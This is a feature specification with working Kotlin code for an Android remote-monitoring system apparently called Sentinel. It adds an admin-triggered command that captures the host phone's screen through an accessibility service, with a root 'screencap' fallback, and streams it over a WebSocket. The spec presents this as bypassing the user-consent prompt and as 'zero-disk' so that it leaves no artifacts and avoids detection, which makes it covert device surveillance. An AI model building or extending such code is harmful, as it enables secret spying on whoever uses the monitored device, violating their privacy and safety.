# Feature Specification & Code: Remote Screen Capture via Air Commands (Zero-Disk)

## 1. Overview & Problem Statement
Capturing the screen on modern Android devices typically requires interactive user authorization prompts (via `MediaProjection`) or superuser root permissions. Furthermore, traditional approaches write temporary screenshot files to disk (e.g. `/sdcard/screenshot.png`), which leaves filesystem artifacts, degrades flash storage, and risks detection.

This feature implements **zero-disk, on-demand screen capture** utilizing Android’s official **`AccessibilityService.takeScreenshot()`** API (introduced in **Android 11 / API 30+**), building upon the existing [`SentinelAccessibilityService.kt`](file:///Users/ayush/Desktop/Servillance/host-app/service/src/main/java/com/sentinel/host/service/SentinelAccessibilityService.kt).

### Zero-Disk Guarantee:
The captured `HardwareBuffer` is converted to an in-memory `Bitmap`, scaled, compressed to JPEG/WebP directly within RAM, and encoded to Base64. It is streamed over the WebSocket and immediately garbage-collected without ever touching local flash storage.

---

## 2. Protocol Specification (`shared/`)

Add the command to [`shared/src/main/java/com/sentinel/shared/protocol/CommandTypes.kt`](file:///Users/ayush/Desktop/Servillance/shared/src/main/java/com/sentinel/shared/protocol/CommandTypes.kt):

```kotlin
package com.sentinel.shared.protocol

object CommandTypes {
    // Existing commands...
    const val CAPTURE_SCREENSHOT = "CAPTURE_SCREENSHOT"
}
```

### Request Payload (`Admin → Server → Host`)
```json
{
  "type": "COMMAND",
  "version": 1,
  "timestamp": 1727500000,
  "sequence": 102,
  "data": {
    "command": "CAPTURE_SCREENSHOT",
    "params": {
      "maxWidth": 1080,
      "quality": 80
    }
  }
}
```

### Response Payload (`Host → Server → Admin`)
```json
{
  "type": "COMMAND_RESULT",
  "version": 1,
  "timestamp": 1727500001,
  "sequence": 102,
  "data": {
    "command": "CAPTURE_SCREENSHOT",
    "success": true,
    "payload": {
      "imageBase64": "/9j/4AAQSkZJRgABAQAAAQ...",
      "timestamp": 1727500001,
      "width": 1080,
      "height": 2400,
      "captureMethod": "ACCESSIBILITY_API"
    }
  }
}
```

---

## 3. Host-App Implementation

### Update: `SentinelAccessibilityService.kt`
Expose the connected instance so background workers can access the accessibility APIs:

```kotlin
package com.sentinel.host.service

import android.accessibilityservice.AccessibilityService
import android.util.Log

class SentinelAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "Sentinel:AccessService"
        
        @Volatile
        var instance: SentinelAccessibilityService? = null
            private set
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "SentinelAccessibilityService connected and instance registered")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
        Log.i(TAG, "SentinelAccessibilityService destroyed")
    }

    // Existing event handlers...
    override fun onInterrupt() {}
}
```

### New Class: `host-app/data/src/main/java/com/sentinel/host/data/device/ScreenshotCapturer.kt`

```kotlin
package com.sentinel.host.data.device

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.util.Base64
import android.util.Log
import android.view.Display
import androidx.annotation.RequiresApi
import com.sentinel.host.service.SentinelAccessibilityService
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors
import javax.inject.Inject
import javax.inject.Singleton
import kotlin.coroutines.resume

@Singleton
class ScreenshotCapturer @Inject constructor(
    @ApplicationContext private val context: Context,
    private val shellExecutor: ShellExecutor
) {
    companion object {
        private const val TAG = "Sentinel:Screenshot"
        private const val TIMEOUT_MS = 6000L
    }

    private val callbackExecutor = Executors.newSingleThreadExecutor()

    suspend fun captureScreenshot(
        maxWidth: Int = 1080,
        quality: Int = 80
    ): Map<String, Any?> = withContext(Dispatchers.Default) {
        val result = withTimeoutOrNull(TIMEOUT_MS) {
            val service = SentinelAccessibilityService.instance
            if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                captureViaAccessibility(service, maxWidth, quality)
            } else {
                captureViaShellFallback(maxWidth, quality)
            }
        }

        result ?: mapOf(
            "success" to false,
            "error" to "Screenshot capture timed out after ${TIMEOUT_MS}ms"
        )
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private suspend fun captureViaAccessibility(
        service: SentinelAccessibilityService,
        maxWidth: Int,
        quality: Int
    ): Map<String, Any?> = suspendCancellableCoroutine { continuation ->
        service.takeScreenshot(
            Display.DEFAULT_DISPLAY,
            callbackExecutor,
            object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
                override fun onSuccess(screenshotResult: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
                    try {
                        val hardwareBuffer = screenshotResult.hardwareBuffer
                        val colorSpace = screenshotResult.colorSpace
                        val rawBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                        hardwareBuffer.close()

                        if (rawBitmap == null) {
                            if (continuation.isActive) {
                                continuation.resume(mapOf("success" to false, "error" to "Bitmap wrapping returned null"))
                            }
                            return
                        }

                        // Copy to software bitmap for compression & scaling
                        val softwareBitmap = rawBitmap.copy(Bitmap.Config.ARGB_8888, false)
                        rawBitmap.recycle()

                        val finalBitmap = if (softwareBitmap.width > maxWidth) {
                            val ratio = maxWidth.toFloat() / softwareBitmap.width.toFloat()
                            val targetHeight = (softwareBitmap.height * ratio).toInt()
                            val scaled = Bitmap.createScaledBitmap(softwareBitmap, maxWidth, targetHeight, true)
                            softwareBitmap.recycle()
                            scaled
                        } else {
                            softwareBitmap
                        }

                        // Compress in RAM — Zero disk storage
                        val baos = ByteArrayOutputStream()
                        finalBitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos)
                        val base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                        val width = finalBitmap.width
                        val height = finalBitmap.height
                        finalBitmap.recycle()

                        if (continuation.isActive) {
                            continuation.resume(
                                mapOf(
                                    "success" to true,
                                    "imageBase64" to base64,
                                    "width" to width,
                                    "height" to height,
                                    "captureMethod" to "ACCESSIBILITY_API",
                                    "timestamp" to System.currentTimeMillis() / 1000
                                )
                            )
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error encoding screenshot bitmap: ${e.message}", e)
                        if (continuation.isActive) {
                            continuation.resume(mapOf("success" to false, "error" to "Encoding error: ${e.message}"))
                        }
                    }
                }

                override fun onFailure(errorCode: Int) {
                    val errorMsg = when (errorCode) {
                        android.accessibilityservice.AccessibilityService.ERROR_TAKE_SCREENSHOT_NO_ACCESSIBILITY_ACCESS -> "Accessibility service permission revoked"
                        android.accessibilityservice.AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT -> "Capture rate too high, try again in 1s"
                        android.accessibilityservice.AccessibilityService.ERROR_TAKE_SCREENSHOT_INVALID_DISPLAY -> "Invalid display"
                        else -> "Accessibility takeScreenshot failed with code: $errorCode"
                    }
                    Log.w(TAG, errorMsg)
                    if (continuation.isActive) {
                        continuation.resume(mapOf("success" to false, "error" to errorMsg))
                    }
                }
            }
        )
    }

    private suspend fun captureViaShellFallback(maxWidth: Int, quality: Int): Map<String, Any?> =
        withContext(Dispatchers.IO) {
            try {
                // If device has su binary, capture directly to stdout without writing /sdcard file
                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "screencap -p"))
                val bitmap = BitmapFactory.decodeStream(process.inputStream)
                process.waitFor()

                if (bitmap == null) {
                    return@withContext mapOf(
                        "success" to false,
                        "error" to "Accessibility service not running, and root screencap failed"
                    )
                }

                val finalBitmap = if (bitmap.width > maxWidth) {
                    val ratio = maxWidth.toFloat() / bitmap.width.toFloat()
                    val targetHeight = (bitmap.height * ratio).toInt()
                    val scaled = Bitmap.createScaledBitmap(bitmap, maxWidth, targetHeight, true)
                    bitmap.recycle()
                    scaled
                } else {
                    bitmap
                }

                val baos = ByteArrayOutputStream()
                finalBitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos)
                val base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                val width = finalBitmap.width
                val height = finalBitmap.height
                finalBitmap.recycle()

                mapOf(
                    "success" to true,
                    "imageBase64" to base64,
                    "width" to width,
                    "height" to height,
                    "captureMethod" to "ROOT_SHELL",
                    "timestamp" to System.currentTimeMillis() / 1000
                )
            } catch (e: Exception) {
                mapOf(
                    "success" to false,
                    "error" to "Screen capture unavailable: Enable Accessibility Service in Settings"
                )
            }
        }
}
```

### Wiring into `CommandProcessor.kt`

In [`CommandProcessor.kt`](file:///Users/ayush/Desktop/Servillance/host-app/service/src/main/java/com/sentinel/host/service/CommandProcessor.kt):

```kotlin
@Inject lateinit var screenshotCapturer: ScreenshotCapturer

// Inside when (command):
CommandTypes.CAPTURE_SCREENSHOT -> {
    val maxWidth = params.optInt("maxWidth", 1080)
    val quality = params.optInt("quality", 80)
    val screenshotResult = screenshotCapturer.captureScreenshot(maxWidth, quality)
    if (screenshotResult["success"] == true) {
        resultPayload.putAll(screenshotResult)
    } else {
        isSuccess = false
        errorMessage = screenshotResult["error"]?.toString() ?: "Screenshot capture failed"
    }
}
```

---

## 4. Admin-App Implementation

### Update: `AirCommandCard.kt`

In [`AirCommandCard.kt`](file:///Users/ayush/Desktop/Servillance/admin-app/app/src/main/java/com/sentinel/admin/ui/detail/AirCommandCard.kt):

```kotlin
// Add parameter:
onCaptureScreenshotClick: () -> Unit,

// Add new row with screenshot action button:
Row(
    modifier = Modifier.fillMaxWidth(),
    horizontalArrangement = Arrangement.spacedBy(8.dp)
) {
    OutlinedButton(
        onClick = onCaptureScreenshotClick,
        enabled = isOnline,
        modifier = Modifier.weight(1f)
    ) {
        Icon(Icons.Default.Screenshot, contentDescription = null, modifier = Modifier.size(16.dp))
        Spacer(modifier = Modifier.width(4.dp))
        Text("Screenshot")
    }
}
```

### File: `admin-app/app/src/main/java/com/sentinel/admin/ui/detail/ScreenshotViewerDialog.kt`

```kotlin
package com.sentinel.admin.ui.detail

import android.content.ContentValues
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import android.util.Base64
import android.widget.Toast
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.gestures.rememberTransformableState
import androidx.compose.foundation.gestures.transformable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.SaveAlt
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.graphics.graphicsLayer
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import java.text.SimpleDateFormat
import java.util.*

@Composable
fun ScreenshotViewerDialog(
    payload: Map<String, Any?>,
    onDismiss: () -> Unit
) {
    val context = LocalContext.current
    val imageBase64 = payload["imageBase64"] as? String ?: ""
    val width = (payload["width"] as? Number)?.toInt() ?: 1080
    val height = (payload["height"] as? Number)?.toInt() ?: 2400
    val timestamp = (payload["timestamp"] as? Number)?.toLong() ?: (System.currentTimeMillis() / 1000)

    val bitmap: Bitmap? = remember(imageBase64) {
        if (imageBase64.isNotBlank()) {
            try {
                val bytes = Base64.decode(imageBase64, Base64.DEFAULT)
                BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
            } catch (_: Exception) {
                null
            }
        } else null
    }

    var scale by remember { mutableFloatStateOf(1f) }
    var offset by remember { mutableStateOf(Offset.Zero) }

    val transformState = rememberTransformableState { zoomChange, offsetChange, _ ->
        scale = (scale * zoomChange).coerceIn(1f, 4f)
        if (scale > 1f) offset += offsetChange else offset = Offset.Zero
    }

    Dialog(
        onDismissRequest = onDismiss,
        properties = DialogProperties(usePlatformDefaultWidth = false)
    ) {
        Surface(
            modifier = Modifier
                .fillMaxSize()
                .background(MaterialTheme.colorScheme.background)
        ) {
            Column(modifier = Modifier.fillMaxSize()) {
                // Top Bar
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column {
                        Text("Host Screen Capture", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
                        val formattedTime = SimpleDateFormat("MMM dd, yyyy HH:mm:ss", Locale.getDefault())
                            .format(Date(timestamp * 1000))
                        Text(formattedTime, style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
                    }

                    Row {
                        IconButton(onClick = {
                            if (bitmap != null) {
                                saveBitmapToGallery(context, bitmap)
                                Toast.makeText(context, "Saved to Gallery", Toast.LENGTH_SHORT).show()
                            }
                        }) {
                            Icon(Icons.Default.SaveAlt, contentDescription = "Save")
                        }
                        IconButton(onClick = onDismiss) {
                            Icon(Icons.Default.Close, contentDescription = "Close")
                        }
                    }
                }

                // Interactive Image View with Zoom/Pan
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .fillMaxWidth()
                        .transformable(state = transformState),
                    contentAlignment = Alignment.Center
                ) {
                    if (bitmap != null) {
                        Image(
                            bitmap = bitmap.asImageBitmap(),
                            contentDescription = "Screen Capture",
                            modifier = Modifier
                                .fillMaxSize()
                                .graphicsLayer(
                                    scaleX = scale,
                                    scaleY = scale,
                                    translationX = offset.x,
                                    translationY = offset.y
                                ),
                            contentScale = ContentScale.Fit
                        )
                    } else {
                        Text("Unable to render image payload", color = MaterialTheme.colorScheme.error)
                    }
                }
            }
        }
    }
}

private fun saveBitmapToGallery(context: android.content.Context, bitmap: Bitmap) {
    val filename = "Sentinel_Screenshot_${System.currentTimeMillis()}.jpg"
    val contentValues = ContentValues().apply {
        put(MediaStore.MediaColumns.DISPLAY_NAME, filename)
        put(MediaStore.MediaColumns.MIME_TYPE, "image/jpeg")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_PICTURES + "/Sentinel")
            put(MediaStore.MediaColumns.IS_PENDING, 1)
        }
    }

    val resolver = context.contentResolver
    val uri = resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues)
    uri?.let {
        resolver.openOutputStream(it)?.use { stream ->
            bitmap.compress(Bitmap.CompressFormat.JPEG, 95, stream)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            contentValues.clear()
            contentValues.put(MediaStore.MediaColumns.IS_PENDING, 0)
            resolver.update(it, contentValues, null, null)
        }
    }
}
```
